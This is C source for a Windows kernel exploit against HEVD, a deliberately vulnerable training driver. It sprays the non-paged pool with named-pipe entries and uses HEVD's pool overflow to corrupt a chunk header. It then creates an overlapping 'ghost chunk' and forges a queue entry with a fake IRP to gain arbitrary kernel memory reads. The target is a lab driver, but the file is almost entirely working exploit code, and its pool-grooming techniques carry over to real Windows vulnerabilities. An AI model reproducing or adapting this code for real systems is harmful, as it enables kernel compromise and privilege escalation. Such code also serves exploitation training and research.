#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_read.h"

#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

IRP g_fake_irp;

pipe_group_t* createChunkHoles()
{
    pipe_group_t* victim_chunks = SprayNpDataQueueEntry(NUM_PIPES_SPRAY, VICTIM_CHUNK_SIZE, NULL, 0);

    // Create holes
    for (size_t i = 0; i < victim_chunks->nb; i += 3)
    {
        FreeNpDataQueueEntry(victim_chunks->pipes[i], VICTIM_CHUNK_SIZE);
        victim_chunks->pipes[i] = { 0 };
    }

    return victim_chunks;
}

void setCacheAlignedFlagOnVictimChunk()
{
    vs_chunk_t overflow_chunk = { 0 };
    overflow_chunk.pool_header.PreviousSize = CALC_NDQE_DataSize(VICTIM_CHUNK_SIZE) / 0x10;
    overflow_chunk.pool_header.PoolIndex = 0;
    overflow_chunk.pool_header.BlockSize = 0;
    overflow_chunk.pool_header.PoolType = 0 | 4; // Set CacheAligned flag

    HANDLE hHevd = HevdOpenDeviceHandle();
    HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, (char*)&overflow_chunk, 0x14);
    CloseHandle(hHevd);

    Sleep(2000);
}

void enableLookaside(int count, ...)
{
    va_list ap;

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNpDataQueueEntry(0x10000, block_size, NULL, 0);
    }
    va_end(ap);

    Sleep(2000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNpDataQueueEntry(0x10000, block_size, NULL, 0);
    }
    va_end(ap);

    Sleep(1000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        size_t block_size = va_arg(ap, size_t);
        SprayNpDataQueueEntry(0x100, block_size, NULL, 0);
        printf("[+] Size 0x%llX enabled\n", block_size);
    }
    va_end(ap);
}

void printHexDump(char* data, size_t size)
{
    for (size_t j = 0; j < size; j++)
    {
        printf("%02x ", data[j] & 0xff);
    }
    puts("");
}

size_t scanPipesForGhostChunkLeak(pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk, vs_chunk_t* leaked_ghost_chunk)
{
    for (size_t i = 0; i < fake_pool_header_chunks->nb; i++)
    {
        char scan_buf[0x1000] = { 0 };

        if (!PeekDataFromPipe(&fake_pool_header_chunks->pipes[i], scan_buf, sizeof(vs_chunk_t)))
        {
            fprintf(stderr, "[-] Failed to peek pipe for overlap detection\n");
            exit(0);
        }

        if (memcmp((char*)fake_vs_chunk, scan_buf, sizeof(vs_chunk_t)))
        {
            printf("\n[+] Chunk overlap detected in pipe %lld\n", i);

            printf("\tOriginal data:     ");
            printHexDump((char*)fake_vs_chunk, sizeof(vs_chunk_t));

            printf("\tLeaked ghost data: ");
            printHexDump(scan_buf, sizeof(vs_chunk_t));

            memcpy(leaked_ghost_chunk, scan_buf, sizeof(vs_chunk_t));
            return i;
        }
    }
    return -1;
}

int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_group_t* victim_chunks, pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk)
{
    pipe_group_t* ghost_chunk_candidates = CreatePipeGroup(NUM_PIPES_SPRAY, GHOST_CHUNK_SIZE);

    uint64_t ghost_chunk_data = GHOST_CHUNK_MARKER_1;
    for (int ghost_chunk_idx = 0; ghost_chunk_idx < victim_chunks->nb; ghost_chunk_idx++)
    {
        printf(".");

        // Free a cache aligned victim chunk to create space for the ghost chunk
        FreeNpDataQueueEntry(victim_chunks->pipes[ghost_chunk_idx], VICTIM_CHUNK_SIZE);

        // Allocate a ghost chunk, potentially occupying the freed cached aligned space
        ghost_chunk_candidates->pipes[ghost_chunk_idx] = AllocNpDataQueueEntry(GHOST_CHUNK_SIZE, (char*)&ghost_chunk_data, 0x8);

        // Check if ghost chunk creation and allocation was successful by detecting information leak
        vs_chunk_t leaked_ghost_chunk_data;
        size_t previous_chunk_idx = scanPipesForGhostChunkLeak(fake_pool_header_chunks, fake_vs_chunk, &leaked_ghost_chunk_data);
        if (previous_chunk_idx != -1)
        {
            printf("[+] Detected information leak from overlapping chunks in pipe %lld (fake_pool_header)\n", previous_chunk_idx);

            addrs->np_ccb_data_queue = (uintptr_t)leaked_ghost_chunk_data.np_data_queue_entry.QueueEntry.Flink;
            printf("[+] np_ccb_data_queue: 0x%llX\n", addrs->np_ccb_data_queue);

            pipes->ghost_chunk_pipe = ghost_chunk_candidates->pipes[ghost_chunk_idx];
            printf("[+] ghost_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->ghost_chunk_pipe.read, pipes->ghost_chunk_pipe.write);
            ghost_chunk_candidates->pipes[ghost_chunk_idx] = { 0 };
            DestroyPipeGroup(ghost_chunk_candidates);

            pipes->previous_chunk_pipe = fake_pool_header_chunks->pipes[previous_chunk_idx];
            printf("[+] previous_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->previous_chunk_pipe.read, pipes->previous_chunk_pipe.write);
            fake_pool_header_chunks->pipes[previous_chunk_idx] = { 0 };
            DestroyPipeGroup(fake_pool_header_chunks);

            return 1;
        }

        // If ghost chunk creation failed, clear the lookaside list head and retry
        victim_chunks->pipes[ghost_chunk_idx] = AllocNpDataQueueEntry(VICTIM_CHUNK_SIZE, NULL, 0);
    }

    fprintf(stderr, "[-] Failed to create ghost chunk: No information leak detected\n");
    return 0;
}

void setFakeNpDataQueueEntry(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    vs_chunk_t fake_np_data_queue_entry_chunk = { 0 };
    fake_np_data_queue_entry_chunk.np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    fake_np_data_queue_entry_chunk.np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    fake_np_data_queue_entry_chunk.np_data_queue_entry.Irp = (uintptr_t)&g_fake_irp; // Fake IRP
    fake_np_data_queue_entry_chunk.np_data_queue_entry.ClientSecurityContext = 0;
    fake_np_data_queue_entry_chunk.np_data_queue_entry.DataEntryType = 0x1; // 0x1: Unbuffered
    fake_np_data_queue_entry_chunk.np_data_queue_entry.DataSize = 0xffffffff;
    fake_np_data_queue_entry_chunk.np_data_queue_entry.QuotaInEntry = 0xffffffff;

    uintptr_t ghost_np_data_queue_entry;
    do
    {
        printf(".");
        FreeNpDataQueueEntry(pipes->previous_chunk_pipe, VULN_CHUNK_SIZE);
        pipes->previous_chunk_pipe = AllocNpDataQueueEntry(VULN_CHUNK_SIZE, (char*)&fake_np_data_queue_entry_chunk, sizeof(vs_chunk_t));
        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->np_ccb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
    } while (ghost_np_data_queue_entry == GHOST_CHUNK_MARKER_1);
    printf("\n");
}

int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    puts("[*] Allocating new VS_SUB_SEGMENT...");
    SprayNpDataQueueEntry(0x20000, VULN_CHUNK_SIZE, NULL, 0);

    puts("[*] Creating chunk holes...");
    pipe_group_t* victim_chunks = createChunkHoles();

    puts("[*] Exploiting HEVD to set CacheAligned flag...");
    setCacheAlignedFlagOnVictimChunk();

    puts("[*] Placing fake POOL_HEADERs for cache alignment...");
    vs_chunk_t fake_vs_chunk = { 0 };
    fake_vs_chunk.pool_header.PreviousSize = 0;
    fake_vs_chunk.pool_header.PoolIndex = 0;
    fake_vs_chunk.pool_header.BlockSize = (GHOST_CHUNK_SIZE - sizeof(HEAP_VS_CHUNK_HEADER)) / 0x10;
    fake_vs_chunk.pool_header.PoolTag = 0x4141414141;

    pipe_group_t* fake_pool_header_chunks = SprayNpDataQueueEntry(NUM_PIPES_SPRAY, VULN_CHUNK_SIZE, (char*)&fake_vs_chunk, sizeof(vs_chunk_t));

    printf("[*] Enabling dynamic lookaside lists (0x%X, 0x%X)...\n", VICTIM_CHUNK_SIZE, GHOST_CHUNK_SIZE);
    enableLookaside(2, VICTIM_CHUNK_SIZE, GHOST_CHUNK_SIZE);

    puts("[*] Creating and locating ghost chunk...");
    if (!createGhostChunk(pipes, addrs, victim_chunks, fake_pool_header_chunks, &fake_vs_chunk))
    {
        fprintf(stderr, "[-] Failed to create ghost chunk\n");
        return 0;
    }

    printf("[*] Enabling a dynamic lookaside list (0x%X)...\n", VULN_CHUNK_SIZE);
    enableLookaside(1, VULN_CHUNK_SIZE);

    puts("[*] Spraying pipes with fake NP_DATA_QUEUE_ENTRY...");
    setFakeNpDataQueueEntry(pipes, addrs);

    return 1;
}

void ArbitraryRead(pipe_pair_t* ghost_pipe, uintptr_t where, char* out, size_t size)
{
    char arb_read[0x1000];

    if (size >= 0x1000)
        size = 0xFFF;

    g_fake_irp.SystemBuffer = where;
    PeekDataFromPipe(ghost_pipe, arb_read, size);
    memcpy(out, arb_read, size);
}
